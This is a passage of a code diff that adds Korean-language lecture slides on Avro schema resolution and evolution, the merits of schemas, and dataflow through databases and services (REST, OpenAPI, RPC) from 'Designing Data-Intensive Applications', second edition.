+    <p>데이터를 <strong>디코딩할 때</strong> 사용하는 스키마.</p>
+  </div>
+</div>
+
+<figure>
+  <img src="https://raw.githubusercontent.com/rlatls1997/books/refs/heads/master/Designing%20Data-Intensive%20Applications%202E/images/5-5.png" alt="Writer's schema와 Reader's schema" onerror="this.style.display='none';this.parentNode.classList.add('img-missing');this.parentNode.dataset.file='5-5.png';">
+  <figcaption>그림 5-5 · Writer/Reader 두 스키마를 대조하여 차이를 해석</figcaption>
+</figure>
+
+<div class="tradeoff">
+  <div class="l">
+    <h4>두 스키마가 같으면</h4>
+    <p>디코딩이 쉬움.</p>
+  </div>
+  <div class="r">
+    <h4>두 스키마가 다르면</h4>
+    <p>Avro가 둘을 <strong>비교해서 차이를 해석</strong>하고 데이터를 writer's schema에서 reader's schema로 변환하는 규칙을 적용해야 함.</p>
+  </div>
+</div>
+
+<h3>Protocol Buffers와 Avro 비교</h3>
+<table>
+  <tr><th></th><th>Protocol Buffers</th><th>Avro</th></tr>
+  <tr><td>인코딩/디코딩 스키마</td><td>서로 다른 버전을 사용 가능</td><td><strong>디코딩에 두 스키마를 사용</strong></td></tr>
+  <tr><td>호환성 메커니즘</td><td><strong>태그 번호</strong>를 사용</td><td>writer/reader 두 스키마를 <strong>대조</strong>하여 차이를 해석</td></tr>
+  <tr><td>제약</td><td>없음</td><td>writer's schema는 인코딩에 쓴 것과 <strong>반드시 동일</strong>해야 함</td></tr>
+</table>
+</div>`});
+
+/* ---- 18. ANIM: Avro reader/writer resolution ---- */
+slides.push({sec:"Formats", title:"애니메이션 · Avro 스키마 해석", anim:"avroresolve", html:`
+<div class="kicker">Animation · Avro Schema Resolution</div>
+<h1>스키마 해석 — Writer vs Reader 매칭</h1>
+<p class="lead" style="margin-bottom:6px">Writer 스키마와 Reader 스키마가 다를 때 — Avro가 어떻게 필드를 짝짓고 빠진 곳을 메우는지 단계별로 보자.</p>
+
+<figure style="margin:6px 0">
+  <img src="https://raw.githubusercontent.com/rlatls1997/books/refs/heads/master/Designing%20Data-Intensive%20Applications%202E/images/5-6.png" alt="스키마 해석" onerror="this.style.display='none';this.parentNode.classList.add('img-missing');this.parentNode.dataset.file='5-6.png';">
+  <figcaption>그림 5-6 · 필드를 이름으로 매칭, 순서가 달라도 됨</figcaption>
+</figure>
+
+<div class="anim-stage">
+  <div class="avro-stage">
+    <div class="avro-col">
+      <div class="h">Writer Schema (옛)</div>
+      <div id="avW"></div>
+    </div>
+    <div class="avro-mid">
+      <div style="font-size:24px">⇄</div>
+      <div style="font-size:11px;letter-spacing:.12em;color:var(--gold);margin-top:6px">RESOLVE<br>BY NAME</div>
+    </div>
+    <div class="avro-col">
+      <div class="h">Reader Schema (새)</div>
+      <div id="avR"></div>
+    </div>
+  </div>
+  <div class="anim-ctrl">
+    <button id="avNext">▶ 다음 규칙 시연</button>
+    <button id="avReset">↻ 리셋</button>
+    <span class="status" id="avStatus">'다음 규칙 시연'을 눌러 단계별로 진행하세요</span>
+  </div>
+</div>
+
+<div class="cols3" style="margin-top:6px">
+  <div class="card teal"><span class="pill t">규칙 ①</span><p class="mini"><b>순서 무관</b> · writer/reader 필드 순서가 달라도 됨 — 이름으로 매칭함.</p></div>
+  <div class="card gold"><span class="pill g">규칙 ②</span><p class="mini"><b>writer만 있는 필드</b> · reader가 모르는 필드는 무시함.</p></div>
+  <div class="card accent"><span class="pill r">규칙 ③</span><p class="mini"><b>reader만 있는 필드</b> · reader 스키마에 정의된 <b>기본값</b>으로 채움.</p></div>
+</div>
+`});
+
+/* ---- 19. Avro schema evolution rules ---- */
+slides.push({sec:"Formats", title:"Avro 스키마 진화 규칙", html:`
+<div class="kicker">1-4. Schema Evolution Rules</div>
+<h1>Avro 호환성 규칙</h1>
+<div class="scroll">
+<div class="cols">
+  <div class="card teal">
+    <h3>상위 호환성</h3>
+    <p>writer's 스키마가 reader's 스키마보다 <strong>더 새로운 버전</strong>의 스키마를 사용할 때의 호환성.</p>
+  </div>
+  <div class="card teal">
+    <h3>하위 호환성</h3>
+    <p>writer's 스키마가 reader's 스키마보다 <strong>더 오래된 버전</strong>의 스키마를 사용할 때의 호환성.</p>
+  </div>
+</div>
+
+<div class="card accent">
+  <h3>핵심 규칙 — 기본값(default value)이 있는 필드만 추가하거나 제거</h3>
+  <ul>
+    <li><strong>기본값 없는 필드를 추가</strong>하면 → 새 reader가 옛 writer의 데이터를 읽지 못함 → <strong>하위 호환성 깨짐</strong></li>
+    <li><strong>기본값 없는 필드를 제거</strong>하면 → 옛 reader가 새 writer의 데이터를 읽지 못함 → <strong>상위 호환성 깨짐</strong></li>
+  </ul>
+</div>
+
+<div class="card gold">
+  <h3>null 처리</h3>
+  <p>일부 프로그래밍 언어에서 null이 기본적으로 허용되는데 Avro는 그렇지 않음. 필드가 null이 될 수 있게 하려면 <strong>union 타입</strong>을 사용해야 함.</p>
+<pre><span class="k">union</span> { null, long, string } field;
+<span class="c">// field는 숫자, 문자열, 또는 null 가능</span></pre>
+  <p class="mini">null을 기본으로 허용하는 것보다 장황할 수 있지만, null이 허용되는 필드와 아닌 필드를 명확히 구분하여 <strong>버그 예방</strong>.</p>
+</div>
+
+<div class="card teal">
+  <h3>타입·이름 변경</h3>
+  <ul>
+    <li><b>데이터타입 변경</b> · 타입을 변환할 수 있는 경우 가능</li>
+    <li><b>필드 이름 변경</b> · 가능하지만 까다로움
+      <ul style="margin-top:4px">
+        <li>reader 스키마가 필드 이름의 <strong>별칭(alias)</strong>을 담을 수 있어서 옛 writer 스키마의 필드 이름을 별칭과 매칭</li>
+        <li>결과 — 필드 이름 변경은 <strong>하위 호환되나, 상위 호환은 안 됨</strong></li>
+        <li>이유 — 리더 스키마에 별칭을 넣을 수 있어서 새 리더가 옛 이름을 이해할 수 있음. 반면 옛 리더는 별칭을 모르므로 새 이름을 이해하지 못함</li>
+      </ul>
+    </li>
+  </ul>
+</div>
+</div>`});
+
+/* ---- 20. But what is writer's schema? ---- */
+slides.push({sec:"Formats", title:"writer's schema 전달 방법", html:`
+<div class="kicker">1-4. Where Does the Schema Come From?</div>
+<h1>리더는 writer's schema를 어떻게 아는가?</h1>
+<div class="scroll">
+<p class="lead">중요한 질문 — <em>리더는 특정 데이터를 인코딩하는 데 사용한 스키마를 어떻게 알까?</em></p>
+<p>스키마를 알게 하기 위해 전체 스키마를 매 레코드마다 포함할 수는 없음. (공간 절약 이점이 사라짐)</p>
+<p class="lead" style="font-style:italic;color:var(--accent)">→ 답은 <strong>"Avro가 사용되는 맥락"에 따라 다름.</strong></p>
+
+<div class="cols3">
+  <div class="card accent">
+    <span class="pill r">맥락 ①</span>
+    <h3>큰 파일, 많은 레코드</h3>
+    <p class="mini">수백만 레코드가 모두 같은 스키마로 인코딩된 큰 파일.</p>
+    <p><b>해결</b> · 파일 라이터가 <strong>파일 시작 부분에 스키마를 단 한 번</strong> 포함.</p>
+    <p class="mini">Avro가 이를 위한 파일 포맷(<i>object container files</i>)을 명세함.</p>
+  </div>
+  <div class="card teal">
+    <span class="pill t">맥락 ②</span>
+    <h3>개별 레코드 DB</h3>
+    <p class="mini">DB에서는 서로 다른 레코드가 다른 시점에 다른 스키마로 쓰일 수 있음.</p>
+    <p><b>해결</b> · 모든 인코딩 레코드 시작 부분에 <strong>버전 번호</strong>를 포함. DB에 <strong>스키마 버전 목록</strong>을 유지.</p>
+    <p class="mini">리더는 레코드의 버전 번호를 보고 해당하는 writer's 스키마를 찾아서 디코딩.<br>ex) Confluent의 Schema Registry, LinkedIn의 Espresso</p>
+  </div>
+  <div class="card gold">
+    <span class="pill g">맥락 ③</span>
+    <h3>네트워크 연결로 전송</h3>
+    <p class="mini">두 프로세스가 양방향 네트워크 연결로 통신.</p>
+    <p><b>해결</b> · 연결 설정 시점에 <strong>스키마 버전을 협상</strong>하고 연결 수명 동안 그 스키마를 사용.</p>
+    <p class="mini">ex) Avro RPC</p>
+  </div>
+</div>
+
+<div class="note"><b>공통점</b> · 세 방식 중 어떤 경우든 <strong>스키마 버전 DB</strong>를 만들어 두는 것은 유용함. (문서 역할, 스키마 호환성 검사 용도 등 장점)</div>
+</div>`});
+
+/* ---- 21. Dynamically generated schemas ---- */
+slides.push({sec:"Formats", title:"동적 생성 스키마", html:`
+<div class="kicker">1-4. Dynamically Generated Schemas</div>
+<h1>Avro의 결정적 장점 — 동적 스키마 친화성</h1>
+<div class="scroll">
+<p class="lead">Avro는 Protocol Buffers와 대비하여 <strong>한 가지 장점</strong>이 있다 — 스키마에 태그 번호가 없다는 것. 왜 이게 장점일까?</p>
+
+<div class="card teal">
+  <h3>예시 — 관계형 DB를 파일로 dump</h3>
+  <p class="mini">텍스트 형식의 문제를 피하기 위해 이진 형식 사용을 원한다고 가정하자.</p>
+</div>
+
+<h3>Avro를 사용할 경우</h3>
+<div class="card accent">
+  <p>관계형 스키마로부터 Avro 스키마를 <strong>꽤 쉽게 생성</strong>함.</p>
+  <ul>
+    <li>각 DB 테이블이 <strong>레코드 스키마</strong>에 해당</li>
+    <li>각 컬럼이 <strong>레코드의 필드</strong>에 해당</li>
+    <li>DB 컬럼 이름이 <strong>Avro의 필드 이름</strong>에 해당</li>
+  </ul>
+</div>
+
+<h3>만약 DB 스키마가 바뀌면? (컬럼 추가/삭제)</h3>
+<div class="tradeoff">
+  <div class="r">
+    <span class="pill t">Avro</span>
+    <h4>업데이트된 DB 스키마에서<br>새 Avro 스키마를 생성</h4>
+    <p>업데이트된 DB 스키마에서 <strong>새 Avro 스키마를 생성</strong>하고 새 스키마로 데이터를 내보내기만 하면 됨.</p>
+    <p class="mini">데이터 내보내기 작업에서는 스키마 변경에 신경 쓸 필요가 없음. 새 데이터를 읽는 사람은 필드가 바뀐 걸 보지만 <strong>필드가 이름으로 식별</strong>되므로 옛 reader 스키마와 여전히 호환됨.</p>
+  </div>
+  <div class="l">
+    <span class="pill r">Protobuf</span>
+    <h4>필드 태그를<br>수작업으로 할당</h4>
+    <p>DB 스키마가 바뀔 때마다 관리자가 <strong>DB 컬럼 이름 → 필드 태그 매핑을 수동으로 갱신</strong>해야 함.</p>
+    <p class="mini">이 부분은 자동화를 할 수도 있지만, 스키마 생성기가 <em>이전에 사용했던 필드 태그를 재할당하지 않도록</em> 조심해야 함.</p>
+  </div>
+</div>
+
+<div class="note"><b>요약</b> · 필드 이름으로 매칭 → 사람의 개입이 적은 도구 친화적 진화. Avro가 자동화 파이프라인에 더 매끄럽게 들어맞는 이유.</div>
+</div>`});
+
+/* ---- 22. Merits of schemas ---- */
+slides.push({sec:"Formats", title:"스키마의 장점", html:`
+<div class="kicker">1-5. The Merits of Schemas</div>
+<h1>스키마 기반 이진 인코딩의 미덕</h1>
+<div class="scroll">
+<div class="card teal">
+  <h3>Protocol Buffers와 Avro의 공통점</h3>
+  <ul>
+    <li>둘 다 이진 인코딩 형식을 위한 <strong>스키마</strong>를 사용</li>
+    <li>스키마 언어가 XML Schema, JSON Schema보다 훨씬 <strong>단순</strong></li>
+    <li>단순하기 때문에 구현과 사용이 쉬움</li>
+  </ul>
+</div>
+
+<div class="card gold">
+  <h3>새로운 아이디어가 아님 — ASN.1</h3>
+  <ul>
+    <li><strong>1984년</strong> 처음 표준화된 스키마 정의 언어</li>
+    <li>다양한 네트워크 프로토콜에 정의되어 사용됐으며, SSL 인증서(X.509) 인코딩을 위한 DER 인코딩에도 사용됨</li>
+    <li>Protocol Buffers와 유사하게 <strong>태그 번호</strong>로 스키마 진화 지원</li>
+    <li>하지만 매우 <em>복잡하고 문서화가 부실</em></li>
+  </ul>
+</div>
+
+<div class="card accent">
+  <h3>데이터 시스템의 독자 이진 인코딩</h3>
+  <p>많은 데이터 시스템이 자체 데이터에 대한 <strong>독자적(proprietary) 이진 인코딩</strong>을 구현함.</p>
+  <ul>
+    <li>대부분의 RDB는 쿼리를 보내고 응답받는 <strong>네트워크 프로토콜</strong>을 가짐</li>
+    <li>DB 벤더가 드라이버(ex. ODBC, JDBC API)를 제공 — DB 네트워크 프로토콜 응답을 인메모리 자료구조로 <strong>디코딩</strong></li>
+  </ul>
+</div>
+
+<h3>스키마 기반 이진 인코딩의 좋은 속성들</h3>
+<div class="cols">
+  <div class="card teal">
+    <h3>① 압축성</h3>
+    <p class="mini">필드 이름을 생략할 수 있어서 압축성이 좋음</p>
+  </div>
+  <div class="card teal">
+    <h3>② 최신 문서 역할</h3>
+    <p class="mini">스키마 자체가 가치 있는 문서. 그리고 디코딩에 스키마가 필수이므로 <strong>최신 상태임이 보장</strong>됨</p>
+  </div>
+  <div class="card teal">
+    <h3>③ 호환성 사전 검사</h3>
+    <p class="mini">스키마 DB를 사용하여 스키마 변경의 상위/하위 호환성을 <strong>검사 가능</strong></p>
+  </div>
+  <div class="card teal">
+    <h3>④ 컴파일 타임 타입 체크</h3>
+    <p class="mini">스키마로부터 코드를 생성하므로 <strong>컴파일 시점에 타입 검사</strong>가 가능</p>
+  </div>
+</div>
+
+<div class="note"><b>요약</b> · 스키마 진화는 <strong>유연성</strong>을 제공함과 동시에 데이터에 대한 <strong>보장(안전성)</strong>도 가능함. 단, 동시에 운영하는 스키마 형식의 수는 최소로 유지하는 것이 운영을 단순하게 만듦.</div>
+</div>`});
+
+/* ---- 23. Modes of Dataflow ---- */
+slides.push({sec:"Dataflow", title:"데이터플로 4가지 방식", html:`
+<div class="kicker">2. Modes of Dataflow</div>
+<h1>데이터의 흐름 — 누가 인코딩하고 누가 디코딩하는가</h1>
+<div class="scroll">
+<p class="lead">앞에서 다양한 인코딩과 상위/하위 호환성을 배웠음. 여기서 호환성은 <strong>관계</strong>이다 — <em>데이터를 인코딩하는 프로세스</em>와 그것을 <em>디코딩하는 다른 프로세스</em> 사이의 관계.</p>
+<p>이제부터는 데이터가 흐르는 방식(누가 쓰고 누가 읽는지, 시간 간격이 얼마인지)에 따라 달라지는 호환성 요구를 알아봄.</p>
+
+<div class="arrowflow">
+  <span class="b">메모리 공유 X</span><span class="a">→</span><span class="b">바이트 시퀀스로 인코딩</span><span class="a">→</span><span class="b">다른 프로세스로 전달</span>
+</div>
+
+<div class="cols">
+  <div class="card accent">
+    <span class="pill r">2-1</span>
+    <h3>데이터베이스</h3>
+    <p class="mini">쓰는 프로세스가 인코딩, 읽는 프로세스가 디코딩.</p>
+    <p>시간 간격 — 수 분 ~ 수 년.</p>
+  </div>
+  <div class="card teal">
+    <span class="pill t">2-2</span>
+    <h3>서비스 (REST/RPC)</h3>
+    <p class="mini">클라이언트 ↔ 서버. 동기적 요청/응답.</p>
+    <p>각 요청은 보통 수 ms ~ 수 초.</p>
+  </div>
+  <div class="card gold">
+    <span class="pill g">2-3</span>
+    <h3>Durable Execution & Workflow</h3>
+    <p class="mini">여러 서비스 호출의 시퀀스를 신뢰성 있게 실행.</p>
+    <p>WAL 기반 재실행.</p>
+  </div>
+  <div class="card blue">
+    <span class="pill b">2-4</span>
+    <h3>이벤트 기반 (메시지 브로커)</h3>
+    <p class="mini">비동기 메시지. 브로커가 송수신을 분리.</p>
+    <p>송신자는 보내고 잊음.</p>
+  </div>
+</div>
+</div>`});
+
+/* ---- 24. Dataflow Through DB ---- */
+slides.push({sec:"Dataflow", title:"DB를 통한 데이터 흐름", html:`
+<div class="kicker">2-1. Dataflow Through Databases</div>
+<h1>DB를 통한 데이터 흐름</h1>
+<div class="scroll">
+<p class="lead">데이터베이스에서는 <strong>쓰는 프로세스가 인코딩</strong>, <strong>읽는 프로세스가 디코딩</strong>을 함.</p>
+
+<div class="cols">
+  <div class="card accent">
+    <h3>① 단일 프로세스만 접근</h3>
+    <ul>
+      <li>리더는 같은 프로세스의 <strong>더 나중 버전</strong> (DB에 쓰여진 데이터를 읽는 리더는 시간적으로 항상 더 나중의 상태를 읽음)</li>
+      <li>writer의 입장에서는 DB에 저장하는 것이 <em>미래의 자신에게 메시지를 보내는 것</em>과 같음</li>
+      <li>→ <strong>하위 호환성이 필요</strong> (아니면 미래의 내가 과거의 내가 쓴 것을 디코딩하지 못함)</li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <h3>② 여러 프로세스가 접근</h3>
+    <ul>
+      <li>일부 프로세스가 새 코드, 일부가 옛 코드 (ex. 롤링 업그레이드 중)</li>
+      <li>DB의 데이터가 새 버전 코드로 쓰였는데, 읽히는 건 옛 버전의 코드일 수 있음</li>
+      <li>→ <strong>상위 호환성도 필요</strong> (옛 코드가 새 코드가 쓴 데이터를 읽을 수 있어야 함)</li>
+    </ul>
+  </div>
+</div>
+
+<div class="note"><b>결론</b> · DB는 시간을 가로지르는 통신 채널. 따라서 <strong>양방향 호환성</strong>이 모두 필요함.</div>
+</div>`});
+
+/* ---- 25. Different values written at different times ---- */
+slides.push({sec:"Dataflow", title:"서로 다른 시점에 쓰인 값들", html:`
+<div class="kicker">2-1. Different Values Written at Different Times</div>
+<h1>5년 전 인코딩한 데이터가 그대로 남아 있다</h1>
+<div class="scroll">
+<div class="card accent">
+  <h3>DB의 특성</h3>
+  <ul>
+    <li>DB는 일반적으로 어떤 값이든 <strong>언제든 갱신을 허용</strong> (방금 쓴 값과, 5년 전에 쓴 값이 공존 가능)</li>
+    <li>새 버전 애플리케이션 배포 시 옛 버전은 몇 분 안에 새 버전으로 교체됨</li>
+    <li>하지만 <strong>DB 내용은 그렇지 않음</strong> — 5년 전 인코딩 그대로 남아 있을 수 있음</li>
+  </ul>
+</div>
+
+<div class="card gold">
+  <h3>데이터 마이그레이션을 미루는 이유</h3>
+  <p>스키마가 새로 바뀌면 데이터를 다시 쓸 수 있다고 생각할 수 있음. 하지만 그러지 않는 이유가 있음.</p>
+  <ul>
+    <li>큰 데이터셋에서 <strong>비용이 비쌈</strong></li>
+    <li>그래서 대부분의 DB는 이 작업을 <strong>연기하고 비동기적으로 수행</strong>
+      <ul>
+        <li>LSM-tree storage engine의 <strong>압축(compaction)</strong></li>
+        <li>대부분의 관계형 DB · <em>null 기본값인 새 컬럼 추가</em> 같은 스키마 진화는 <strong>기존 데이터를 다시 쓰지 않고</strong> 허용</li>
+      </ul>
+    </li>
+  </ul>
+</div>
+
+<div class="card teal">
+  <h3>하지만 여전히 재작성 필요</h3>
+  <p>복잡한 스키마 변경에서는 여전히 데이터 재작성이 필요함. 이런 상황에서의 마이그레이션 중 상위/하위 호환성 유지는 <strong>여전히 연구 과제</strong>임.</p>
+</div>
+</div>`});
+
+/* ---- 26. Archival storage ---- */
+slides.push({sec:"Dataflow", title:"아카이브 저장소", html:`
+<div class="kicker">2-1. Archival Storage</div>
+<h1>아카이브 저장소 — 한 번 쓰고 영원히</h1>
+<div class="scroll">
+<p class="lead">가끔 DB의 스냅샷을 찍을 수 있다 — 백업용, 데이터 웨어하우스 로딩용.</p>
+
+<div class="card teal">
+  <h3>최신 스키마로 통합</h3>
+  <p>이 경우, 원본 DB가 여러 버전의 스키마로 인코딩된 상태이더라도 <strong>최신 스키마로 인코딩하여 데이터를 덤프</strong>함.</p>
+</div>
+
+<div class="card gold">
+  <h3>형식 선택</h3>
+  <p>데이터 덤프는 한 번 쓰이고 나서부터는 <strong>불변</strong>이라서 <strong>Avro</strong> 같은 형식이 잘 맞음.</p>
+  <p class="mini">아니면 상황에 따라 분석에 친화적인 <strong>Parquet</strong> 같은 칼럼 지향 형식(column-oriented format)도 좋음.</p>
+</div>
+
+<div class="arrowflow">
+  <span class="b">여러 버전 스키마의 DB</span><span class="a">→</span><span class="b">최신 스키마로 통합 덤프</span><span class="a">→</span><span class="b">Avro / Parquet</span>
+</div>
+</div>`});
+
+/* ---- 27. Services REST and RPC intro ---- */
+slides.push({sec:"Dataflow", title:"서비스 — REST와 RPC", html:`
+<div class="kicker">2-2. Dataflow Through Services</div>
+<h1>서비스 간 데이터 흐름 — REST와 RPC</h1>
+<div class="scroll">
+<p class="lead">서비스 간 데이터 흐름에서는 보통 두 가지 역할로 <strong>client</strong>와 <strong>server</strong>를 나눌 수 있음.</p>
+
+<div class="cols3">
+  <div class="card"><b>Server</b><p class="mini">네트워크를 통해 API 노출(expose)</p></div>
+  <div class="card"><b>Client</b><p class="mini">서버에 연결해 API를 요청(request)</p></div>
+  <div class="card"><b>Service</b><p class="mini">서버가 노출하는 API</p></div>
+</div>
+
+<div class="card teal">
+  <h3>웹이 작동하는 방식</h3>
+  <ol>
+    <li>클라이언트(웹 브라우저)가 웹 서버에 요청 (HTML/CSS/JS는 GET, 데이터 제출은 POST)</li>
+    <li>API는 표준화된 프로토콜과 데이터 형식의 집합(HTTP, URL, SSL/TLS 등...)</li>
+    <li>브라우저, 서버, 웹사이트 작성자는 이 표준에 합의함 → <strong>어떤 브라우저로든 웹사이트 접근 가능</strong></li>
+  </ol>
+  <p class="mini">브라우저만이 클라이언트는 아님. 모바일·데스크톱 네이티브 앱도 서버와 통신 가능. 이 경우 보통 클라이언트 측 코드가 처리하기 쉬운 인코딩 데이터(ex. JSON)로 응답.</p>
+</div>
+
+<h3>서비스 vs 데이터베이스</h3>
+<div class="tradeoff">
+  <div class="l">
+    <span class="pill r">DB</span>
+    <h4>데이터베이스</h4>
+    <ul>
+      <li><b>쿼리</b> · 쿼리 언어로 <strong>임의 쿼리</strong> 가능</li>
+      <li>유연하지만 통제 약함</li>
+    </ul>
+  </div>
+  <div class="r">
+    <span class="pill t">Service</span>
+    <h4>서비스</h4>
+    <ul>
+      <li><b>쿼리</b> · 애플리케이션 특화 API. <strong>정해진 입출력만</strong> 허용</li>
+      <li>특성 · 캡슐화, 클라이언트의 접근을 세밀하게 제한</li>
+    </ul>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>독립적 배포와 진화</h3>
+  <p>서비스 지향(service-oriented), 마이크로 서비스(microservices) 아키텍처의 목표는 애플리케이션을 더 쉽게 변경하고 유지보수하기 위함.</p>
+  <ul>
+    <li>각 서비스는 하나의 팀이 소유, 다른 팀과 조율 없이 새 버전을 배포할 수 있어야 함</li>
+    <li>옛/새 버전의 서버와 클라이언트가 <strong>동시 실행</strong>될 수 있다 → 데이터 인코딩은 서비스 API의 <strong>버전 간 호환</strong>이 되어야 함</li>
+    <li>호환성은 각 팀이 서로 발목을 잡지 않기 위한 <strong>계약</strong></li>
+  </ul>
+</div>
+</div>`});
+
+/* ---- 28. Web services and REST ---- */
+slides.push({sec:"Dataflow", title:"Web Services와 REST", html:`
+<div class="kicker">2-2. Web Services</div>
+<h1>Web Service와 REST</h1>
+<div class="scroll">
+<div class="card teal">
+  <h3>Web Service란?</h3>
+  <p>HTTP가 서비스와 통신하는 <strong>기저 프로토콜</strong>로 사용되는 서비스.</p>
+  <p class="mini">"Web Service"라는 용어가 살짝 부적절한 이름일 수 있는데, 웹에서만 쓰이는 게 아니기 때문.</p>
+  <ul>
+    <li>사용자 기기의 클라이언트 앱 → 서비스 (모바일 네이티브 앱, 브라우저 JS 앱이 HTTP 요청)</li>
+    <li>같은 조직의 서비스 → 서비스</li>
+    <li>다른 조직의 서비스 → 서비스</li>
+  </ul>
+</div>
+
+<div class="card accent">
+  <h3>REST (Representational State Transfer)</h3>
+  <p>HTTP의 원칙 위에 구성된 서비스의 <strong>설계 철학</strong>.</p>
+  <ul>
+    <li>단순한 데이터 형식</li>
+    <li>리소스 식별에 <strong>URL</strong> 사용</li>
+    <li>캐시 제어, 인증, 컨텐트 타입 협상에 <strong>HTTP 기능</strong> 활용</li>
+  </ul>
+  <p class="mini">REST 원칙에 따라 설계된 API를 <strong>RESTful</strong>이라 함.</p>
+</div>
+
+<div class="card gold">
+  <h3>클라이언트는 API 세부를 어떻게 아는가?</h3>
+  <p>클라이언트는 어떤 HTTP 엔드포인트에 질의해야 할지, 어떤 데이터 형식을 보내고 어떤 응답을 기대할지 알아야 함.</p>
+  <p>그래서 서비스 개발자는,</p>
+  <ul>
+    <li>IDL(Interface Definition Language)로 API 명세 문서를 작성, 최신화</li>
+    <li>다른 개발자는 그 문서로 질의 방법을 파악</li>
+  </ul>
+</div>
+
+<h3>인기 있는 두 서비스 IDL</h3>
+<div class="cols">
+  <div class="card">
+    <b>OpenAPI Specification (OAS)</b>
+    <p class="mini">용도 · JSON을 주고받는 웹 서비스</p>
+  </div>
+  <div class="card">
+    <b>Protocol Buffers</b>
+    <p class="mini">용도 · gRPC 서비스</p>
+  </div>
+</div>
+</div>`});
+
+/* ---- 29. OpenAPI and gRPC examples + frameworks ---- */
+slides.push({sec:"Dataflow", title:"OpenAPI 예시와 서비스 프레임워크", html:`
+<div class="kicker">2-2. IDL Examples &amp; Service Frameworks</div>
+<h1>IDL 예시와 서비스 프레임워크</h1>
+<div class="scroll">
+<h3>OpenAPI 예시</h3>
+<pre><span class="k">openapi</span>: <span class="s">3.0.0</span>
+<span class="k">info</span>:
+  <span class="k">title</span>: <span class="s">Ping, Pong</span>
+  <span class="k">version</span>: <span class="s">1.0.0</span>
+<span class="k">servers</span>:
+  - <span class="k">url</span>: <span class="s">http://localhost:8080</span>
+<span class="k">paths</span>:
+  <span class="s">/ping</span>:
+    <span class="k">get</span>:
+      <span class="k">summary</span>: <span class="s">Given a ping, returns a pong message</span>
+      <span class="k">responses</span>:
+        <span class="s">'200'</span>:
+          <span class="k">description</span>: <span class="s">A pong</span>
+          <span class="k">content</span>:
+            <span class="s">application/json</span>:
+              <span class="k">schema</span>:
+                <span class="k">type</span>: <span class="s">object</span>
+                <span class="k">properties</span>:
+                  <span class="k">message</span>:
+                    <span class="k">type</span>: <span class="s">string</span>
+                    <span class="k">example</span>: <span class="s">Pong!</span></pre>
+
+<p class="mini">Protocol Buffers는 앞에서 본 Protobuf IDL을 사용.</p>
+
+<div class="card accent">
+  <h3>서비스 프레임워크 — 왜 필요한가?</h3>
+  <p>설계 철학과 IDL을 정했다 하더라도, 개발자는 여전히 API 호출을 구현하는 코드를 작성해야 함.</p>
+  <p>이런 노력을 단순화하기 위한 <strong>서비스 프레임워크</strong>가 존재함. (ex. Spring Boot, FastAPI, gRPC...)</p>
+  <p class="mini">프레임워크가 라우팅, 캐싱, 인증 등을 처리하여 개발자는 <strong>비즈니스 로직에만 집중</strong>할 수 있음.</p>
+</div>
+
+<h3>서비스 정의와 코드의 결합 — 두 가지 방향</h3>
+<div class="tradeoff">
+  <div class="l">
+    <span class="pill r">코드 우선</span>
+    <h4>Code-First</h4>
+    <p>서버를 코드로 작성 → <strong>IDL이 자동 생성</strong></p>
+    <p class="mini">ex) FastAPI</p>
+  </div>
+  <div class="r">
+    <span class="pill t">정의 우선</span>
+    <h4>Definition-First</h4>
+    <p>서비스 정의(명세) 먼저 작성 → <strong>서버 코드 골격 생성</strong></p>
+    <p class="mini">ex) gRPC</p>
+  </div>
+</div>
+
+<div class="card gold">
+  <h3>IDL 도구의 능력</h3>
+  <p>코드 생성 외에도 Swagger 같은 IDL 도구는 다음을 할 수 있음.</p>
+  <ul>
+    <li>문서 생성</li>
+    <li>스키마 변경 호환성 검증</li>
+    <li>테스트를 위한 GUI 제공</li>
+  </ul>
+</div>
+</div>`});
+
+/* ---- 30. RPC problems ---- */
+slides.push({sec:"Dataflow", title:"RPC의 문제점", html:`
+<div class="kicker">2-2. Problems with Remote Procedure Calls</div>
+<h1>RPC — 매력적이지만 근본적 결함이 있다</h1>
+<div class="scroll">
+<p class="lead">웹 서비스는 네트워크 API 요청을 하는 기술들 중 <strong>최신 버전</strong>일 뿐임. 이전엔 다음과 같은 기술들이 있었는데 문제가 많았음.</p>
+
+<div class="cols">
+  <div class="card accent">
+    <ul>
+      <li><b>EJB, Java RMI</b> · Java에만 한정</li>
+      <li><b>DCOM</b> · Microsoft 기술에 한정</li>
+      <li><b>CORBA</b> · 지나치게 복잡. 상위/하위 호환성이 없음</li>
+      <li><b>SOAP, WS-*</b> · 벤더 간 상호 운용이 목표였음. 복잡성, 호환성 문제</li>
+    </ul>
+  </div>
+  <div class="card teal">
+    <h3>모든 기술의 기반</h3>
+    <p>위와 같은 많은 기술이 있는데, 모든 기술은 <strong>1970년대에 도입된 RPC(Remote Procedure Call)</strong> 개념을 기반으로 함.</p>
+    <p class="mini">RPC 모델 · 원격 네트워크 서비스에 대한 요청을, <strong>같은 프로세스 안에서 함수/메서드를 호출하는 것과 똑같아 보이게</strong> 만드는 것이 목표.</p>
+  </div>
+</div>
+
+<div class="note"><b>RPC의 근본 결함</b> · 메서드 호출하듯 요청하는 게 편해 보이지만, <strong>네트워크 요청과 로컬 함수 호출은 매우 다르다</strong>.</div>
+</div>`});
+
+/* ---- 31. Network vs local function differences ---- */
+slides.push({sec:"Dataflow", title:"네트워크 vs 로컬 함수 호출 차이", html:`
+<div class="kicker">2-2. Why RPC Is Different from Local Calls</div>
+<h1>네트워크 요청과 로컬 함수 호출이 다른 6가지 이유</h1>
+<div class="scroll">
+<table>
+  <tr><th>관점</th><th>로컬 함수 호출</th><th>네트워크 요청</th></tr>
+  <tr>
+    <td><b>① 예측 가능성</b></td>
+    <td>예측 가능 — 내가 통제하는 매개변수에 따라 성공 또는 실패</td>
+    <td><strong>예측 불가</strong> — 내 통제 밖에 있는 문제 多 (원격 머신 등)</td>
+  </tr>
+  <tr>
+    <td><b>② 결과의 종류</b></td>
+    <td>결과 반환, 예외 발생, 무한 대기 중 하나</td>
+    <td>추가 결과 — <strong>타임아웃 등으로 결과 없이 반환</strong>. 이 경우 무슨 일이 일어났는지 알 수 없음. 요청이 잘 도달했는지도 불명확</td>
+  </tr>
+  <tr>
+    <td><b>③ 재시도</b></td>
+    <td>재시도 처리가 명확</td>
+    <td>실제 처리되었더라도 <strong>응답만 유실</strong>될 수 있어 재시도 처리가 불명확</td>
+  </tr>
+  <tr>
+    <td><b>④ 실행 시간/지연</b></td>
+    <td>보통 처리 시간이 비슷함</td>
